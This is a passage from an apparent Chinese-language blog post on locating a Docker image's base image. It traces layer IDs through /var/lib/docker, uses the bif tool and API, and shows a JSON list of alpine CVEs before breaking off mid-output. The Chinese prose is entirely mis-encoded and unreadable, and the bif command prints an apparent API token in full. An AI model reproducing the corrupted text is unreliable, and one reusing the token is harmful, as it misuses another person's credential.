<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/docker/image/overlay2/distribution/diffid-by-digest/sha256</span><br><span class="line"><span class="comment"># å­˜æ”¾diffID -&gt; layerID æ­£å‘æŸ¥è¯¢ï¼Œä»¥æ–‡ä»¶åè¿›è¡ŒæŸ¥è¯¢</span></span><br><span class="line">/var/lib/docker/image/overlay2/distribution/v2metadata-by-diffid/sha256</span><br><span class="line"><span class="comment"># å­˜æ”¾layerID -&gt; diffID åå‘æŸ¥è¯¢ï¼Œä»¥æ–‡ä»¶åè¿›è¡ŒæŸ¥è¯¢</span></span><br></pre></td></tr></table></figure>

<p><strong>chainIDï¼š</strong></p>
<ul>
<li>å¦‚æœlayeræ˜¯æœ€åº•å±‚ï¼Œæ²¡æœ‰ä»»ä½•çˆ¶layerï¼Œé‚£ä¹ˆ <strong>diffID &#x3D; chainID</strong></li>
<li>å¦åˆ™ï¼Œ<strong>chainID(n)&#x3D;sha256sum(chainID(n-1)) diffID(n))</strong></li>
</ul>
<p><strong>cacheID:</strong></p>
<p>æˆ‘ä»¬æƒ³è¦çš„ç¬¬ä¸€å±‚layeråˆšå¥½æ²¡æœ‰ä»»ä½•çˆ¶layerï¼Œæ‰€ä»¥diffID&#x3D;chainIDï¼Œè®¿é—®&#x2F;var&#x2F;lib&#x2F;docker&#x2F;image&#x2F;overlay2&#x2F;layerdb&#x2F;sha256&#x2F;{chainID}&#x2F;cache-idæ–‡ä»¶å¯ä»¥è·å–cache-id</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/file1.png" alt="file1"></p>
<p>æˆ‘ä»¬æƒ³è¦è·å–çš„é•œåƒ&#x2F;etc&#x2F;os-releaseæ–‡ä»¶åœ¨å®¿ä¸»æœºçš„çœŸå®è·¯å¾„è¡¨ç°ä¸º&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;{cache-id}&#x2F;diff&#x2F;etc&#x2F;os-release</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/lib/docker/overlay2/&#123;cache-id&#125;/diff/etc/os-release</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/file2.png" alt="file2"></p>
<h3 id="åˆ©ç”¨é•œåƒæ–‡ä»¶ç³»ç»ŸæŸ¥çœ‹åŸºç¡€é•œåƒ"><a href="#åˆ©ç”¨é•œåƒæ–‡ä»¶ç³»ç»ŸæŸ¥çœ‹åŸºç¡€é•œåƒ" class="headerlink" title="åˆ©ç”¨é•œåƒæ–‡ä»¶ç³»ç»ŸæŸ¥çœ‹åŸºç¡€é•œåƒ"></a>åˆ©ç”¨é•œåƒæ–‡ä»¶ç³»ç»ŸæŸ¥çœ‹åŸºç¡€é•œåƒ</h3><p>åœ¨manifest.jsonæ–‡ä»¶ä¸­æ‰¾åˆ°ç¬¬ä¸€ä¸ªlayerçš„æ–‡ä»¶åï¼Œè¿›å…¥taråŒ…å¹¶æŸ¥çœ‹&#x2F;etc&#x2F;os-releaseæ–‡ä»¶ï¼Œèƒ½å¤Ÿè·å–åŸºç¡€é•œåƒä¿¡æ¯</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/find.jpg" alt="find"></p>
<h2 id="1-2-bifå¼€æºå·¥å…·"><a href="#1-2-bifå¼€æºå·¥å…·" class="headerlink" title="1.2 bifå¼€æºå·¥å…·"></a>1.2 bifå¼€æºå·¥å…·</h2><ul>
<li>ç»´æŠ¤äº†ä¸€ä¸ªåŸºç¡€é•œåƒæŸ¥è¯¢æœåŠ¡å™¨è¾“å…¥é•œåƒåæ¥æŸ¥è¯¢åŸºç¡€é•œåƒ</li>
</ul>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/code.jpg" alt="code"></p>
<ul>
<li>è¿è¡Œå‘½ä»¤å’Œæˆªå›¾</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bif find --image us-docker.pkg.dev/fairwinds-ops/oss/polaris:7.0.0 --insights-oss-token  cde4be88-d5a6-4cbb-ae0f-0f4653724623</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/bif.jpg" alt="bif"></p>
<ul>
<li>è°ƒç”¨API</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET https://bif-server-6biex2p5nq-uc.a.run.app/base?image_tag=&#123;å®Œæ•´é•œåƒå&#125;</span><br><span class="line"># headersä¸­éœ€è¦åŠ å…¥ä¸€ä¸ªè®¤è¯å­—æ®µ</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer &#123;ä½ çš„token&#125;</span><br></pre></td></tr></table></figure>

<p>æäº¤è¯·æ±‚åè¿”å›jsonä¿¡æ¯</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;image_repository&quot;</span><span class="punctuation">:</span> <span class="string">&quot;us-docker.pkg.dev/fairwinds-ops/oss/polaris&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;image_tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;image_platform&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;base_images&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;image_repository&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alpine&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;image_tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.16.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;vulnerabilities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-2097&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">5.3</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-30065&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.8</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-37434&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CRITICAL&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">9.8</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-4304&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">5.9</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-4450&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.5</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0215&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.5</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0286&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.4</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0464&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UNKNOWN&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0465&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-2650&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-3446&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UNKNOWN&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-3817&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;last_scan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-08-24T21:00:58.176344Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;upgrades&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;minor&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;image_tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.18.4&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;last_scan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-09-29T00:13:31.931497Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;fixed_vulnerabilities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-2097&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">5.3</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-30065&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.8</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-37434&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CRITICAL&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">9.8</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-4304&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">5.9</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-4450&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.5</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0215&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.5</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0286&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.4</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0464&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UNKNOWN&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0465&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-2650&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-3446&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UNKNOWN&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-3817&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;patch&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;image_tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.16.7&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;last_scan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-08-07T22:13:31.226553Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;fixed_vulnerabilities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-2097&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">5.3</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-30065&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.8</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-37434&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CRITICAL&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">9.8</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-4304&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">5.9</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-4450&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.5</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0215&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.5</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0286&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.4</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0464&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UNKNOWN&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0465&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-2650&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-3446&quot;</span><span class="punctuation">,</span></span><br><span class="line">                      